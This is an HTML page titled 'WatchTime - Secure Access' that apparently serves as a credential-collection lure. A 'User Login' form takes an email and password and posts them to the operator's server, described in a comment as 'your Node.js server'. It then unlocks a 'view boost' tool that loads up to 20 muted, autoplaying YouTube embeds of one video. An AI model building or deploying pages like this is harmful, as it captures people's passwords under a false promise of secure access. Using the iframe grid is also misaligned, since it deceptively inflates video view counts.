<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WatchTime - Secure Access</title>
    <style>
        :root { --bg: #121212; --accent: #ff0000; --text: #ffffff; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 10px; width: 350px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #333; border: none; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: var(--accent); color: white; border: none; cursor: pointer; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        iframe { width: 100%; height: 100px; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <h2 id="title">User Login</h2>
    <form id="loginForm" onsubmit="event.preventDefault(); submitData();">
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button type="submit">Submit</button>
    </form>
</div>

<div id="boostApp" style="display:none; width: 900px; text-align: center;">
    <input type="text" id="url" placeholder="YouTube URL">
    <input type="number" id="tabs" placeholder="Tabs (1-20)">
    <button onclick="start()">Start Streaming</button>
    <div class="grid" id="video-grid"></div>
</div>

<script>
    function submitData() {
        const data = { email: document.getElementById('email').value, password: document.getElementById('pass').value };
        
        // This sends the data to your Node.js server
        fetch('/submit-login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `email=${data.email}&password=${data.password}`
        }).then(() => {
            document.getElementById('ui').style.display = 'none';
            document.getElementById('boostApp').style.display = 'block';
        });
    }

    function start() {
        const url = document.getElementById('url').value;
        const tabs = document.getElementById('tabs').value;
        const videoId = url.split(/(?:v=|youtu\.be\/)([^&?]+)/)[1] || 'dQw4w9WgXcQ';
        const grid = document.getElementById('video-grid');
        for(let i=0; i<tabs; i++) {
            grid.innerHTML += `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1&loop=1&playlist=${videoId}"></iframe>`;
        }
    }
</script>

</body>
</html>
